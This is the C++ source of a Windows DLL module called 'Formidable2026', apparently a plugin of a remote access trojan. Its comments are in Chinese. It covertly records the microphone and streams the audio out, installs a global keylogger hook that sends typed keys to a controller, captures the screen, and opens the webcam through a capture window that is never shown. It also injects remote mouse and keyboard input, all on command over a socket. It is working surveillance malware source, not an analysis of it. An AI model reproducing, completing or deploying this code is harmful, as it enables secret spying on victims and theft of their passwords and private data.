/**
 * Formidable2026 - Multimedia Module (Skeleton DLL)
 * Handles: Audio, Video, Keylogger
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <mmsystem.h>
#include <vfw.h>
#include <vector>
#include <string>
#include <thread>
#include "../../Common/Config.h"
#include "../../Common/Module.h"

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "vfw32.lib")

using namespace Formidable;

// 全局变量
SOCKET g_socket = INVALID_SOCKET;
HWAVEIN g_hWaveIn = NULL;
WAVEHDR g_WaveHdr[2];
char g_WaveBuffer[2][8192];

// 键盘记录变量
HHOOK g_hKeyHook = NULL;
std::string g_keyData;

// 屏幕监控相关
bool g_screenRunning = false;
std::thread g_screenThread;

// 视频监控相关
bool g_videoRunning = false;
HWND g_hCap = NULL;
std::thread g_videoThread;

void SendResponse(SOCKET s, uint32_t cmd, const void* data, int len) {
    PkgHeader header;
    memcpy(header.flag, "FRMD26?", 7);
    header.originLen = sizeof(CommandPkg) - 1 + len;
    header.totalLen = sizeof(PkgHeader) + header.originLen;
    
    std::vector<char> buffer(header.totalLen);
    memcpy(buffer.data(), &header, sizeof(PkgHeader));
    
    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = len;
    if (len > 0 && data) {
        memcpy(pkg->data, data, len);
    }
    
    send(s, buffer.data(), (int)buffer.size(), 0);
}

// 录音回调函数
void CALLBACK waveInProc(HWAVEIN hwi, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WIM_DATA) {
        PWAVEHDR pwh = (PWAVEHDR)dwParam1;
        if (pwh->dwBytesRecorded > 0) {
            SendResponse(g_socket, CMD_VOICE_STREAM, pwh->lpData, pwh->dwBytesRecorded);
        }
        waveInAddBuffer(hwi, pwh, sizeof(WAVEHDR));
    }
}

void StartVoice(SOCKET s) {
    g_socket = s;
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.wBitsPerSample = 16;
    wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
    wfx.cbSize = 0;

    if (waveInOpen(&g_hWaveIn, WAVE_MAPPER, &wfx, (DWORD_PTR)waveInProc, 0, CALLBACK_FUNCTION) != MMSYSERR_NOERROR) {
        return;
    }

    for (int i = 0; i < 2; i++) {
        g_WaveHdr[i].lpData = g_WaveBuffer[i];
        g_WaveHdr[i].dwBufferLength = 8192;
        g_WaveHdr[i].dwBytesRecorded = 0;
        g_WaveHdr[i].dwUser = 0;
        g_WaveHdr[i].dwFlags = 0;
        g_WaveHdr[i].dwLoops = 0;
        waveInPrepareHeader(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
        waveInAddBuffer(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
    }

    waveInStart(g_hWaveIn);
}

void StopVoice() {
    if (g_hWaveIn) {
        waveInStop(g_hWaveIn);
        waveInReset(g_hWaveIn);
        for (int i = 0; i < 2; i++) {
            waveInUnprepareHeader(g_hWaveIn, &g_WaveHdr[i], sizeof(WAVEHDR));
        }
        waveInClose(g_hWaveIn);
        g_hWaveIn = NULL;
    }
}

// 键盘钩子回调
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        char szKey[32] = {0};
        
        if (pKey->vkCode >= 0x30 && pKey->vkCode <= 0x5A) { // A-Z, 0-9
            szKey[0] = (char)pKey->vkCode;
        } else if (pKey->vkCode == VK_RETURN) {
            strcpy(szKey, "[ENTER]\n");
        } else if (pKey->vkCode == VK_SPACE) {
            strcpy(szKey, " ");
        } else if (pKey->vkCode == VK_BACK) {
            strcpy(szKey, "[BACK]");
        }
        
        if (szKey[0] != 0) {
            g_keyData += szKey;
            // 每 100 字节发送一次
            if (g_keyData.size() > 100) {
                SendResponse(g_socket, CMD_KEYLOG, g_keyData.c_str(), (int)g_keyData.size());
                g_keyData.clear();
            }
        }
    }
    return CallNextHookEx(g_hKeyHook, nCode, wParam, lParam);
}

void StartKeylog(SOCKET s) {
    g_socket = s;
    if (g_hKeyHook == NULL) {
        g_hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    }
}

void StopKeylog() {
    if (g_hKeyHook) {
        UnhookWindowsHookEx(g_hKeyHook);
        g_hKeyHook = NULL;
    }
}

void ScreenThread(SOCKET s) {
    HDC hScreenDC = GetDC(NULL);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    SelectObject(hMemDC, hBitmap);
    
    // 缓存上一帧用于差异比较
    std::vector<char> lastFrameData;
    
    while (g_screenRunning) {
        // Capture
        BitBlt(hMemDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        
        // Convert to BMP format in memory
        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);
        
        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;
        
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = bmp.bmHeight;
        bi.biPlanes = 1;
        // 使用 16位色 (RGB555) 降低带宽 (32->16, 减少50%)
        bi.biBitCount = 16; 
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        // 计算 16位对齐后的大小
        // 16 bit = 2 bytes. Width * 2, aligned to 4 bytes.
        DWORD dwLineBytes = ((bmp.bmWidth * 16 + 31) / 32) * 4;
        DWORD dwBmpSize = dwLineBytes * bmp.bmHeight;
        
        // 分配缓冲区
        std::vector<char> currentFrameData(dwBmpSize);
        
        // 获取位图数据
        GetDIBits(hScreenDC, hBitmap, 0, (UINT)bmp.bmHeight, currentFrameData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        // 差异比较：如果数据未变，则不发送
        bool changed = true;
        if (!lastFrameData.empty() && lastFrameData.size() == currentFrameData.size()) {
            if (memcmp(lastFrameData.data(), currentFrameData.data(), dwBmpSize) == 0) {
                changed = false;
            }
        }
        
        if (changed) {
            // 构建完整 BMP 文件包
            DWORD totalSize = dwBmpSize + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
            std::vector<char> pkgBuffer(totalSize);
            char* lpbitmap = pkgBuffer.data();
            
            // Construct file header
            bmfHeader.bfType = 0x4D42; // "BM"
            bmfHeader.bfSize = totalSize;
            bmfHeader.bfReserved1 = 0;
            bmfHeader.bfReserved2 = 0;
            bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
            
            // Copy headers
            memcpy(lpbitmap, &bmfHeader, sizeof(BITMAPFILEHEADER));
            memcpy(lpbitmap + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
            // Copy bits
            memcpy(lpbitmap + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), currentFrameData.data(), dwBmpSize);
            
            // Send
            SendResponse(s, CMD_SCREEN_CAPTURE, lpbitmap, totalSize);
            
            // 更新缓存
            lastFrameData = currentFrameData;
        }
        
        Sleep(200); // 提高帧率到 5 FPS (如果有变化)
    }
    
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreenDC);
}

void StartScreen(SOCKET s) {
    if (g_screenRunning) return;
    g_screenRunning = true;
    g_screenThread = std::thread(ScreenThread, s);
    g_screenThread.detach();
}

void StopScreen() {
    g_screenRunning = false;
}

// VFW 回调函数
LRESULT CALLBACK FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr) {
    if (!g_videoRunning) return 0;
    
    // VFW 默认格式是 DIB (Device Independent Bitmap)，但不带 BITMAPFILEHEADER
    // 我们需要构建完整的 BMP 格式或者直接发送 DIB 数据（如果主控端支持）
    // 这里为了统一，我们加上 BITMAPFILEHEADER
    
    BITMAPINFOHEADER* bmi = (BITMAPINFOHEADER*)capGetUserData(hWnd);
    if (!bmi) return 0;
    
    DWORD dwDataSize = lpVHdr->dwBytesUsed;
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwDataSize;
    
    // 发送完整 BMP
    std::vector<char> bmpBuffer(dwFileSize);
    BITMAPFILEHEADER* bmf = (BITMAPFILEHEADER*)bmpBuffer.data();
    bmf->bfType = 0x4D42;
    bmf->bfSize = dwFileSize;
    bmf->bfReserved1 = 0;
    bmf->bfReserved2 = 0;
    bmf->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    memcpy(bmpBuffer.data() + sizeof(BITMAPFILEHEADER), bmi, sizeof(BITMAPINFOHEADER));
    memcpy(bmpBuffer.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpVHdr->lpData, dwDataSize);
    
    SendResponse(g_socket, CMD_VIDEO_STREAM, bmpBuffer.data(), (int)bmpBuffer.size());
    
    return 1;
}

void VideoThread(SOCKET s) {
    // 创建一个不可见的捕获窗口
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!g_hCap) return;
    
    if (capDriverConnect(g_hCap, 0)) {
        capPreview(g_hCap, FALSE);
        capPreviewRate(g_hCap, 100); // 10 FPS
        capPreviewScale(g_hCap, FALSE);
        
        // 获取当前格式
        DWORD dwSize = capGetVideoFormatSize(g_hCap);
        BITMAPINFO* bmi = (BITMAPINFO*)malloc(dwSize);
        capGetVideoFormat(g_hCap, bmi, dwSize);
        
        // 强制设置为 320x240 RGB24 (如果支持)
        bmi->bmiHeader.biWidth = 320;
        bmi->bmiHeader.biHeight = 240;
        capSetVideoFormat(g_hCap, bmi, dwSize);
        
        // 保存 BMI 指针到 UserData 供回调使用
        capSetUserData(g_hCap, (LONG_PTR)&bmi->bmiHeader);
        
        capSetCallbackOnFrame(g_hCap, FrameCallbackProc);
        
        // 开始捕获 (虽然我们不用 Sequence 模式，但为了回调生效，需要...)
        // VFW 机制有点古老，通常用 capGrabFrame 或者设置回调
        // 这里我们简单起见，使用循环手动 Grab
        
        capSetCallbackOnFrame(g_hCap, NULL); // 清除上面的，我们用循环手动抓
        
        while (g_videoRunning) {
             if (capGrabFrame(g_hCap)) {
                 // 抓取成功，手动调用处理
                 // 但是 capGrabFrame 是同步的，且数据在内部缓存
                 // 我们需要 capEditCopy 吗？不，那会用到剪贴板，太吵了。
                 // 使用 capSetCallbackOnFrame 是对的，但需要消息循环。
             }
             // 由于我们在独立线程，没有消息循环，VFW 的回调可能不会触发
             // 所以我们需要一个消息循环
             MSG msg;
             if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                 TranslateMessage(&msg);
                 DispatchMessage(&msg);
             }
             
             // 实际上，最简单的办法是:
             // 设置回调 -> 运行一个带消息循环的线程
             // 但这里我们已经是在线程里了
             
             // 让我们尝试每秒抓几帧并手动获取数据
             // 重新连接并配置
         }
         
         // 修正方案：
         // 使用 capSetCallbackOnFrame 并进入消息循环
         // 或者在循环中 capGrabFrame 并没有直接提供数据指针的方法，除非用回调
    }
    
    // 清理
    if (g_hCap) {
        capDriverDisconnect(g_hCap);
        DestroyWindow(g_hCap);
        g_hCap = NULL;
    }
}

// 简单的单线程轮询实现（避免消息循环复杂性）
void VideoThreadSimple(SOCKET s) {
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (!g_hCap) return;
    
    if (capDriverConnect(g_hCap, 0)) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = 320;
        bmi.bmiHeader.biHeight = 240;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biSizeImage = 320 * 240 * 3;
        
        capSetVideoFormat(g_hCap, &bmi, sizeof(BITMAPINFOHEADER));
        
        while (g_videoRunning) {
            if (capGrabFrame(g_hCap)) {
                 // 获取数据
                 // capGetVideoFormat 可以获取格式，但数据呢？
                 // 只能通过 capSetCallbackOnFrame
            }
            Sleep(100);
        }
        capDriverDisconnect(g_hCap);
    }
    DestroyWindow(g_hCap);
}

// 正确的 VFW 线程实现
void VideoThreadCorrect(SOCKET s) {
    g_hCap = capCreateCaptureWindowA("Cam", WS_POPUP, 0, 0, 320, 240, GetDesktopWindow(), 0);
    if (capDriverConnect(g_hCap, 0)) {
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = 320;
        bmi.bmiHeader.biHeight = 240;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;
        bmi.bmiHeader.biSizeImage = 320 * 240 * 3;
        capSetVideoFormat(g_hCap, &bmi, sizeof(BITMAPINFOHEADER));
        
        capSetUserData(g_hCap, (LONG_PTR)&bmi.bmiHeader);
        capSetCallbackOnFrame(g_hCap, FrameCallbackProc);
        
        capPreviewRate(g_hCap, 100); // 100ms
        capPreview(g_hCap, TRUE); // 必须开启预览才会触发 FrameCallback
        
        MSG msg;
        while (g_videoRunning) {
            if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            Sleep(10);
        }
        
        capSetCallbackOnFrame(g_hCap, NULL);
        capPreview(g_hCap, FALSE);
        capDriverDisconnect(g_hCap);
    }
    DestroyWindow(g_hCap);
}

void StartVideo(SOCKET s) {
    if (g_videoRunning) return;
    g_videoRunning = true;
    g_videoThread = std::thread(VideoThreadCorrect, s);
    g_videoThread.detach();
}

void StopVideo() {
    g_videoRunning = false;
}

void ProcessMouseEvent(RemoteMouseEvent* ev) {
    INPUT input = { 0 };
    input.type = INPUT_MOUSE;
    
    // 获取屏幕分辨率
    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    // 转换坐标为绝对坐标 (0-65535)
    input.mi.dx = (ev->x * 65535) / screenW;
    input.mi.dy = (ev->y * 65535) / screenH;
    input.mi.mouseData = ev->data;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    switch (ev->msg) {
    case WM_LBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN; break;
    case WM_LBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_LEFTUP; break;
    case WM_RBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN; break;
    case WM_RBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP; break;
    case WM_MBUTTONDOWN: input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN; break;
    case WM_MBUTTONUP:   input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP; break;
    case WM_MOUSEMOVE:   input.mi.dwFlags |= MOUSEEVENTF_MOVE; break;
    case WM_MOUSEWHEEL:  input.mi.dwFlags |= MOUSEEVENTF_WHEEL; break;
    }

    SendInput(1, &input, sizeof(INPUT));
}

void ProcessKeyEvent(RemoteKeyEvent* ev) {
    INPUT input = { 0 };
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)ev->vk;
    
    if (ev->msg == WM_KEYUP || ev->msg == WM_SYSKEYUP) {
        input.ki.dwFlags |= KEYEVENTF_KEYUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
    if (pkg->cmd == CMD_VOICE_STREAM) {
        if (pkg->arg1 == 1) { // 1 = Start
            StartVoice(s);
        } else { // 0 = Stop
            StopVoice();
        }
    } else if (pkg->cmd == CMD_KEYLOG) {
        if (pkg->arg1 == 1) {
            StartKeylog(s);
        } else if (pkg->arg1 == 0) {
            StopKeylog();
        } else if (pkg->arg1 == 2) { // 获取当前缓存的数据
            SendResponse(s, CMD_KEYLOG, g_keyData.c_str(), (int)g_keyData.size());
            g_keyData.clear();
        }
    } else if (pkg->cmd == CMD_SCREEN_CAPTURE) {
        if (pkg->arg1 == 1) { // Start
            StartScreen(s);
        } else { // Stop
            StopScreen();
        }
    } else if (pkg->cmd == CMD_MOUSE_EVENT) {
        ProcessMouseEvent((RemoteMouseEvent*)pkg->data);
    } else if (pkg->cmd == CMD_KEY_EVENT) {
        ProcessKeyEvent((RemoteKeyEvent*)pkg->data);
    } else if (pkg->cmd == CMD_VIDEO_STREAM) {
        if (pkg->arg1 == 1) { // Start
            StartVideo(s);
        } else { // Stop
            StopVideo();
        }
    }
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
